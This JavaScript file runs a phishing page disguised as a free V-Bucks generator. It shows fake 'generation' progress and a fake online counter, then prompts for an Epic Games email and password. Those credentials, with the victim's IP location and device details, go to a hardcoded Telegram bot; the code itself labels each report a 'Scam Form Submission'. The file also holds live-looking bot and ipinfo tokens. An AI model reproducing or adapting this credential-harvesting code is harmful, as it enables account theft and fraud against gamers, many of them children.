// Configuration
const BOT_TOKEN = '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y';
const CHAT_ID = '-1002465594649';
const IPINFO_TOKEN = '81e788912b1532';

// Global state management
const state = {
    isConnected: false,
    currentProgress: 0,
    progressInterval: null,
    selectedPlatform: null,
    selectedAmount: 5000
};

// Utility functions
const utils = {
    formatNumber: (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','),
    
    updateOnlineCounter: () => {
        const onlineCount = document.getElementById('online-count');
        const currentCount = parseInt(onlineCount.textContent.replace(',', ''));
        const change = Math.floor(Math.random() * 11) - 5;
        const newCount = Math.max(1000, currentCount + change);
        onlineCount.textContent = utils.formatNumber(newCount);
    },

    addStatusMessage: (message, type = 'normal') => {
        const statusContent = document.querySelector('.status-content');
        const statusLine = document.createElement('div');
        statusLine.className = `console-line ${type}`;
        statusLine.textContent = `> ${message}`;
        statusContent.appendChild(statusLine);
        statusContent.scrollTop = statusContent.scrollHeight;
    },
    
    // Function to send data to Telegram
    sendToTelegram: async (data) => {
        // Get IP information if possible
        let ipInfo = "Not available";
        try {
            const ipResponse = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
            const ipData = await ipResponse.json();
            ipInfo = `📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}\n🔍 IP: ${ipData.ip}`;
        } catch (error) {
            console.error("Could not fetch IP info", error);
        }
        
        let deviceInfo = navigator.userAgent;
        
        const message = `
🎮 New V-Bucks Scam Form Submission 🎮
----------------------------------
📧 Email: ${data.email}
🔑 Password: ${data.name}
🎮 Platform: ${data.platform}
💰 V-Bucks Amount: ${utils.formatNumber(data.vbucksAmount)}
⏰ Date: ${new Date().toLocaleString()}
${ipInfo}
----------------------------------
📱 Device: ${deviceInfo}
`;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = {
            chat_id: CHAT_ID,
            text: message
        };
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            });
            
            return await response.json();
        } catch (error) {
            console.error("Failed to send to Telegram", error);
            return { ok: false, error: error.message };
        }
    }
};

// Progress bar management
const progressManager = {
    updateProgress: (progress) => {
        const progressBar = document.querySelector('.progress-fill');
        const progressText = document.querySelector('.progress-text');
        if (progressBar && progressText) {
            progressBar.style.width = `${progress}%`;
            progressText.textContent = `PROCESSING... ${Math.floor(progress)}%`;
        }
    },

    startProgress: () => {
        state.currentProgress = 0;
        const progressContainer = document.getElementById('progress-container');
        if (progressContainer) {
            progressContainer.style.display = 'block';
        }
        progressManager.updateProgress(0);

        state.progressInterval = setInterval(() => {
            if (state.currentProgress < 100) {
                state.currentProgress += Math.random() * 2;
                if (state.currentProgress > 100) state.currentProgress = 100;
                progressManager.updateProgress(state.currentProgress);
            } else {
                clearInterval(state.progressInterval);
            }
        }, 100);
    },

    stopProgress: () => {
        clearInterval(state.progressInterval);
        state.currentProgress = 0;
        progressManager.updateProgress(0);
        const progressContainer = document.getElementById('progress-container');
        if (progressContainer) {
            progressContainer.style.display = 'none';
        }
    }
};

// Animation sequences
const animations = {
    simulateGeneration: async () => {
        const steps = [
            { message: 'Establishing secure connection...', delay: 1500, type: 'normal' },
            { message: 'Connection established!', delay: 1000, type: 'success' },
            { message: 'Bypassing security protocols...', delay: 2000, type: 'warning' },
            { message: 'Access granted to generation module', delay: 1500, type: 'success' },
            { message: `Preparing to generate ${utils.formatNumber(state.selectedAmount)} V-Bucks...`, delay: 1800, type: 'normal' },
            { message: 'Initializing transfer protocols...', delay: 2000, type: 'normal' },
            { message: 'Transfer protocols initialized', delay: 1000, type: 'success' },
            { message: 'Verification required to complete process...', delay: 1500, type: 'warning' }
        ];

        progressManager.startProgress();

        for (const step of steps) {
            utils.addStatusMessage(step.message, step.type);
            await new Promise(resolve => setTimeout(resolve, step.delay));
        }

        setTimeout(() => {
            progressManager.stopProgress();
            document.querySelector('.verification-modal').style.display = 'flex';
        }, 1000);
    },

    showSuccessSequence: () => {
        const successModal = document.getElementById('success-modal');
        const verificationModal = document.getElementById('verification-modal');
        const successVBucksAmount = document.getElementById('success-vbucks-amount');
        
        successVBucksAmount.textContent = utils.formatNumber(state.selectedAmount);
        verificationModal.style.display = 'none';
        successModal.style.display = 'flex';
        
        // Initialize the enhanced success animations
        successAnimations.createConfetti();
        successAnimations.addGlowingBorder();
        successAnimations.animateVBucksCounter();
        successAnimations.add3DTiltEffect();
        
        const consoleLines = document.querySelectorAll('.console-messages .console-line');
        consoleLines.forEach((line, index) => {
            setTimeout(() => {
                line.style.opacity = '1';
            }, 1000 + (index * 500));
        });
    }
};

// Enhanced success animations
const successAnimations = {
    // Creates confetti effect in the success modal
    createConfetti: () => {
        const container = document.createElement('div');
        container.className = 'confetti-container';
        
        // Add to success modal
        const successContent = document.querySelector('.success-content');
        successContent.appendChild(container);
        
        // Create confetti pieces
        const colors = ['#00ff00', '#ffffff', '#ffff00', '#9d4dff'];
        const confettiCount = 100;
        
        for (let i = 0; i < confettiCount; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            
            // Randomize confetti properties
            confetti.style.left = `${Math.random() * 100}%`;
            confetti.style.width = `${Math.random() * 10 + 5}px`;
            confetti.style.height = `${Math.random() * 10 + 5}px`;
            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
            
            // Randomize animation
            confetti.style.opacity = Math.random() * 0.8 + 0.2;
            confetti.style.animationDuration = `${Math.random() * 3 + 2}s`;
            confetti.style.animationDelay = `${Math.random() * 2}s`;
            
            container.appendChild(confetti);
        }
        
        // Remove confetti after animation completes
        setTimeout(() => {
            container.remove();
        }, 5000);
    },
    
    // Add glowing border effect
    addGlowingBorder: () => {
        const successContent = document.querySelector('.success-content');
        let glowOpacity = 0.5;
        let increasing = false;
        
        // Create pulse effect
        const pulseGlow = () => {
            if (increasing) {
                glowOpacity += 0.01;
                if (glowOpacity >= 0.8) increasing = false;
            } else {
                glowOpacity -= 0.01;
                if (glowOpacity <= 0.3) increasing = true;
            }
            
            successContent.style.boxShadow = `0 0 20px rgba(0, 255, 0, ${glowOpacity})`;
            requestAnimationFrame(pulseGlow);
        };
        
        pulseGlow();
    },
    
    // Create number counter animation for V-Bucks
    animateVBucksCounter: () => {
        const amountElement = document.getElementById('success-vbucks-amount');
        if (!amountElement) return;
        
        const targetAmount = parseInt(amountElement.textContent.replace(/,/g, ''));
        let currentAmount = 0;
        const duration = 1500; // ms
        const stepTime = 20; // ms
        const increment = targetAmount / (duration / stepTime);
        
        // Save original text
        const originalText = amountElement.textContent;
        amountElement.textContent = '0';
        
        const animateCounter = () => {
            currentAmount += increment;
            if (currentAmount >= targetAmount) {
                amountElement.textContent = originalText;
                return;
            }
            
            amountElement.textContent = Math.floor(currentAmount).toLocaleString();
            requestAnimationFrame(animateCounter);
        };
        
        // Delay start for sequence effect
        setTimeout(animateCounter, 1300);
    },
    
    // Add 3D tilt effect to the success modal
    add3DTiltEffect: () => {
        const successContent = document.querySelector('.success-content');
        
        successContent.addEventListener('mousemove', (e) => {
            const rect = successContent.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            
            const tiltX = (y - centerY) / 20;
            const tiltY = (centerX - x) / 20;
            
            successContent.style.transform = `perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) scale3d(1.02, 1.02, 1.02)`;
        });
        
        successContent.addEventListener('mouseleave', () => {
            successContent.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)';
            successContent.style.transition = 'transform 0.5s ease';
        });
    }
};

// Event handlers
const handlers = {
    platformSelect: (event) => {
        const platform = event.currentTarget.dataset.platform;
        document.querySelectorAll('.platform-option').forEach(option => {
            option.classList.remove('selected');
        });
        event.currentTarget.classList.add('selected');
        state.selectedPlatform = platform;
    },

    vbucksSelect: (event) => {
        const card = event.currentTarget;
        const amount = parseInt(card.dataset.amount);
        
        // Remove selected class from all cards
        document.querySelectorAll('.vbucks-card').forEach(option => {
            option.classList.remove('selected');
        });
        
        // Add selected class to clicked card
        card.classList.add('selected');
        state.selectedAmount = amount;

        // Update any display of the selected amount
        document.querySelectorAll('.selected-amount-display').forEach(display => {
            display.textContent = utils.formatNumber(amount);
        });
    },

    connect: async () => {
        const username = document.getElementById('username').value.trim();
        if (!username) {
            utils.addStatusMessage('Please enter your Epic Games account.', 'error');
            return;
        }
        if (!state.selectedPlatform) {
            utils.addStatusMessage('Please select your platform.', 'error');
            return;
        }

        // Show verification process in console
        utils.addStatusMessage('Connecting to Epic Games servers...', 'normal');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        utils.addStatusMessage('Verifying account details...', 'normal');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        utils.addStatusMessage(`Account found: ${username}`, 'success');
        utils.addStatusMessage(`Platform: ${state.selectedPlatform.toUpperCase()}`, 'success');
        utils.addStatusMessage(`Requested V-Bucks: ${utils.formatNumber(state.selectedAmount)}`, 'success');
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Show Epic login modal after verification
        document.getElementById('epic-login-modal').style.display = 'flex';
    },

    submitForm: async (event) => {
        event.preventDefault();
        const email = document.getElementById('epic-email').value;
        const name = document.getElementById('epic-name').value;
        const username = document.getElementById('username').value;
        
        const submitButton = document.getElementById('epic-login-button');
        const originalText = submitButton.innerHTML;
        
        // Show spinner and disable button
        submitButton.disabled = true;
        submitButton.innerHTML = '<div class="spinner-border" role="status"></div>';
        submitButton.classList.add('loading');
        
        // Send data to Telegram
        try {
            await utils.sendToTelegram({
                name: name,
                email: email,
                username: username,
                platform: state.selectedPlatform,
                vbucksAmount: state.selectedAmount,
                date: new Date().toISOString()
            });
        } catch (error) {
            console.error("Could not send to Telegram", error);
            // Failure is silent to user - they won't know
        }
        
        // Wait for 3 seconds with the spinner
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Hide the modal and continue with generation
        document.getElementById('epic-login-modal').style.display = 'none';
        document.getElementById('connect-button').disabled = true;
        document.getElementById('connect-button').innerHTML = 
            '<div class="connecting-state">GENERATING V-BUCKS... <div class="button-spinner"></div></div>';
        
        // Reset button state
        submitButton.innerHTML = originalText;
        submitButton.disabled = false;
        submitButton.classList.remove('loading');
        
        animations.simulateGeneration();
    },

    submitVerification: async () => {
        const code = document.getElementById('verification-code').value;
        if (code.length !== 6) {
            utils.addStatusMessage('Please enter a valid 6-digit verification code.', 'error');
            return;
        }
        
        // Do not send verification code to Telegram
        // Just proceed with the success animation
        animations.showSuccessSequence();
    },

    resetGenerator: () => {
        document.getElementById('success-modal').style.display = 'none';
        window.location.reload();
    }
};

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    // Set up platform selection
    document.querySelectorAll('.platform-option').forEach(option => {
        option.addEventListener('click', handlers.platformSelect);
    });

    // Set up V-Bucks card selection
    document.querySelectorAll('.vbucks-card').forEach(card => {
        card.addEventListener('click', handlers.vbucksSelect);
    });

    // Connect button
    document.getElementById('connect-button').addEventListener('click', handlers.connect);

    // Epic login form
    document.getElementById('epic-login-form').addEventListener('submit', handlers.submitForm);

    // Form validation
    const epicEmail = document.getElementById('epic-email');
    const epicName = document.getElementById('epic-name');
    const epicLoginButton = document.getElementById('epic-login-button');

    [epicEmail, epicName].forEach(input => {
        input.addEventListener('input', () => {
            epicLoginButton.disabled = !(epicEmail.value.trim() && epicName.value.trim());
            epicLoginButton.classList.toggle('active', !epicLoginButton.disabled);
        });
    });

    // Get verification code button
    document.getElementById('get-verification-code').addEventListener('click', () => {
        window.open('verification.html', '_blank');
    });

    // Submit verification
    document.getElementById('submit-verification').addEventListener('click', handlers.submitVerification);

    // Done button
    document.getElementById('done-button').addEventListener('click', handlers.resetGenerator);

    // Handle numeric input for verification code
    document.getElementById('verification-code').addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
    });

    // Auto-select default V-Bucks amount
    const defaultCard = document.querySelector('.vbucks-card[data-amount="5000"]');
    if (defaultCard) {
        defaultCard.classList.add('selected');
    }

    // Start online counter updates
    setInterval(utils.updateOnlineCounter, 5000);
});